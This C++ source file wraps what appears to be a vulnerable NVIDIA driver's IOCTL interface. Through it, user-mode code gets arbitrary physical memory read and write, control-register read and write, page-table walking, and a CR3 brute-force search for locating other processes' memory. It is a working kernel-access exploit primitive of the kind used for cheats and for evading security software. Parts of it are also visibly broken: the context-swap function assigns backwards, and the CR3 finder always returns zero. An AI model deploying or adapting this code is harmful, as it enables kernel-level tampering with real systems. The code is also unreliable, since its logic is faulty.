#include "NVDrv.h"

uintptr_t NVDrv::MmGetPhysicalAddress(uintptr_t virtual_address)
{
	request_phys_addr Request{};

	Request.request_id = NVFunction::phys_req;
	Request.result_addr = 0;
	Request.virtual_addr = virtual_address;

	this->encrypt_payload(&Request, 0x38, Request.packet_key);

	DWORD BytesReturned{};

	auto status = DeviceIoControl(this->nvhandle, ioctl_code, &Request, 0x138u, &Request, 0x138, &BytesReturned, 0i64);

	if (!status)
	{
		if (DEBUG)
			printf("Failed VTOP for virtual address: %p!\n", (void*)virtual_address);

		return 0;
	}

	return Request.result_addr;
}

BOOL NVDrv::ReadPhysicalMemory(uintptr_t physical_address, void* OUT res, int size)
{
	request_memcpy Request{};
	Request.request_id = NVFunction::phys_read;
	Request.size = size;
	Request.dst_addr = (__int64)res;
	Request.src_addr = physical_address;

	this->encrypt_payload(&Request, 0x38, Request.packet_key);

	DWORD BytesReturned{};
	return DeviceIoControl(this->nvhandle, ioctl_code, &Request, 0x138u, &Request, 0x138, &BytesReturned, 0i64);
}

BOOL NVDrv::WritePhysicalMemory(uintptr_t physical_address, void* IN  res, int size)
{
	request_memcpy Request{};

	Request.request_id = NVFunction::phys_write;
	Request.size = size;
	Request.dst_addr = physical_address;
	Request.src_addr = (__int64)res;

	this->encrypt_payload(&Request, 0x38, Request.packet_key);

	DWORD BytesReturned{};
	return DeviceIoControl(this->nvhandle, ioctl_code, &Request, 0x138u, &Request, 0x138, &BytesReturned, 0i64);
}

BOOL NVDrv::SwapReadContext(uintptr_t target_cr3)
{
	if (!target_cr3)
		return FALSE;

	target_cr3 = this->target_cr3;

	return TRUE;
}

uintptr_t NVDrv::GetSystemCR3()
{
	for (int i = 0; i < 10; i++)
	{
		uintptr_t lpBuffer;
		if (!this->ReadPhysicalMemory(i * 0x10000, &lpBuffer, sizeof(uintptr_t)))
			continue;

		for (int uOffset = 0; uOffset < 0x10000; uOffset += 0x1000)
		{
			uintptr_t value1, value2, value3;

			if (!this->ReadPhysicalMemory(lpBuffer + uOffset, &value1, sizeof(uintptr_t)))
				continue;
			if (!this->ReadPhysicalMemory(lpBuffer + uOffset + 0x70, &value2, sizeof(uintptr_t)))
				continue;
			if (!this->ReadPhysicalMemory(lpBuffer + uOffset + 0xa0, &value3, sizeof(uintptr_t)))
				continue;

			if (0x00000001000600E9 ^ (0xffffffffffff00ff & value1))
				continue;
			if (0xfffff80000000000 ^ (0xfffff80000000000 & value2))
				continue;
			if (0xffffff0000000fff & value3)
				continue;

			return value3;
		}
	}

	return 0;
}

uintptr_t NVDrv::TranslateLinearToPhysicalAddress(uintptr_t virtual_address)
{
	unsigned short PML4 = (unsigned short)((virtual_address >> 39) & 0x1FF);
	uintptr_t PML4E = 0;
	this->ReadPhysicalMemory((this->target_cr3 + PML4 * sizeof(uintptr_t)), &PML4E, sizeof(PML4E));

	unsigned short DirectoryPtr = (unsigned short)((virtual_address >> 30) & 0x1FF);
	uintptr_t PDPTE = 0;
	this->ReadPhysicalMemory(((PML4E & 0xFFFFFFFFFF000) + DirectoryPtr * sizeof(uintptr_t)), &PDPTE, sizeof(PDPTE));

	if ((PDPTE & (1 << 7)) != 0)
		return (PDPTE & 0xFFFFFC0000000) + (virtual_address & 0x3FFFFFFF);

	unsigned short Directory = (unsigned short)((virtual_address >> 21) & 0x1FF);

	uintptr_t PDE = 0;
	this->ReadPhysicalMemory(((PDPTE & 0xFFFFFFFFFF000) + Directory * sizeof(uintptr_t)), &PDE, sizeof(PDE));

	if (PDE == 0)
		return 0;

	if ((PDE & (1 << 7)) != 0)
	{
		return (PDE & 0xFFFFFFFE00000) + (virtual_address & 0x1FFFFF);
	}

	unsigned short Table = (unsigned short)((virtual_address >> 12) & 0x1FF);
	uintptr_t PTE = 0;

	this->ReadPhysicalMemory(((PDE & 0xFFFFFFFFFF000) + Table * sizeof(uintptr_t)), &PTE, sizeof(PTE));

	if (PTE == 0)
		return 0;

	return (PTE & 0xFFFFFFFFFF000) + (virtual_address & 0xFFF);
}

BOOL NVDrv::ReadVirtualMemory(uintptr_t address, LPVOID output, unsigned long size)
{
	if (!address || !size)
		return FALSE;

	uintptr_t PhysicalAddress = this->TranslateLinearToPhysicalAddress(address);

	if (!PhysicalAddress)
		return FALSE;

	if (!this->ReadPhysicalMemory(PhysicalAddress, output, size))
	{
		if (DEBUG)
			printf("Failed ReadVirtualMemory for address: %p!\n", (void*)address);

		return FALSE;
	}

	return TRUE;
}

BOOL NVDrv::WriteVirtualMemory(uintptr_t address, LPVOID data, unsigned long size)
{
	if (!address || !data)
		return FALSE;

	uintptr_t PhysicalAddress = this->TranslateLinearToPhysicalAddress(address);

	if (!PhysicalAddress)
		return FALSE;

	if (!this->WritePhysicalMemory(PhysicalAddress, data, size))
	{
		if (DEBUG)
			printf("Failed WriteVirtualMemory for address: %p!\n", (void*)address);

		return FALSE;

	}
	return TRUE;
}

DWORD NVDrv::ReadCr(int cr)
{
	request_readcr Request{};

	Request.request_id = NVFunction::read_cr;
	Request.cr_num = cr;
	Request.unk_0 = 4;

	this->encrypt_payload(&Request, 0x38, Request.packet_key);

	DWORD BytesReturned{};
	auto status = DeviceIoControl(this->nvhandle, ioctl_code, &Request, 0x138u, &Request, 0x138, &BytesReturned, 0i64);

	if (!status)
		return 0;

	return Request.result;
}

BOOL NVDrv::WriteCr(int cr, DWORD64 value)
{
	request_writecr Request{};

	Request.request_id = NVFunction::write_cr;
	Request.cr_num = cr;
	Request.writevalue = value;
	Request.unk_0 = 4;

	this->encrypt_payload(&Request, 0x38, Request.packet_key);

	DWORD BytesReturned{};
	return DeviceIoControl(this->nvhandle, ioctl_code, &Request, 0x138u, &Request, 0x138, &BytesReturned, 0i64);
}

std::wstring NVDrv::GetProcessPath(const std::wstring& processName)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hSnapshot == INVALID_HANDLE_VALUE) {
		return L"";
	}

	PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
	if (Process32First(hSnapshot, &processEntry)) {
		do {
			if (_wcsicmp(processEntry.szExeFile, processName.c_str()) == 0) {
				CloseHandle(hSnapshot);

				HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processEntry.th32ProcessID);
				if (hProcess != nullptr) {
					wchar_t buffer[MAX_PATH];
					DWORD bufferSize = MAX_PATH;

					if (QueryFullProcessImageName(hProcess, 0, buffer, &bufferSize)) {
						CloseHandle(hProcess);
						return buffer;
					}

					CloseHandle(hProcess);
				}

				return L"";
			}
		} while (Process32Next(hSnapshot, &processEntry));
	}

	CloseHandle(hSnapshot);

	return L"";
}

uintptr_t NVDrv::GetProcessBase(const std::wstring& processName)
{
	return (uintptr_t)LoadLibrary(this->GetProcessPath(processName).c_str());
}

uintptr_t NVDrv::GetProcessCR3(uintptr_t base_address)
{
	if (!base_address) {
		return 0;
	}
	uintptr_t NtdllAddress = reinterpret_cast<uintptr_t>(GetModuleHandleA("ntdll.dll"));
	if (!NtdllAddress) {
		return 0;
	}

	uintptr_t CurrentCR3 = this->ReadCr(NVControlRegisters::CR3);
	if (!CurrentCR3) {
		return 0;
	}

	this->SwapReadContext(CurrentCR3);

	uintptr_t NtdllPhysicalAddress = this->TranslateLinearToPhysicalAddress(NtdllAddress);

	for (uintptr_t i = 0; i != 0x50000000; i++)
	{
		uintptr_t CR3 = i << 12;

		if (CR3 == CurrentCR3)
			continue;


		this->SwapReadContext(CR3);

		uintptr_t PhysicalAddress = this->TranslateLinearToPhysicalAddress(NtdllAddress);

		if (!PhysicalAddress)
			continue;

		if (PhysicalAddress == NtdllPhysicalAddress)
		{
			this->SwapReadContext(CR3);

			const char Bytes = this->Read<char>(base_address);

			if (Bytes == 0x4D)
			{
				if (DEBUG)
					printf("GetProcessCR3: %p\n", (void*)CR3);

				this->SwapReadContext(CR3);

				break;
			}
		}
	}

	FreeLibrary(reinterpret_cast<HMODULE>(NtdllAddress));

	return 0;
}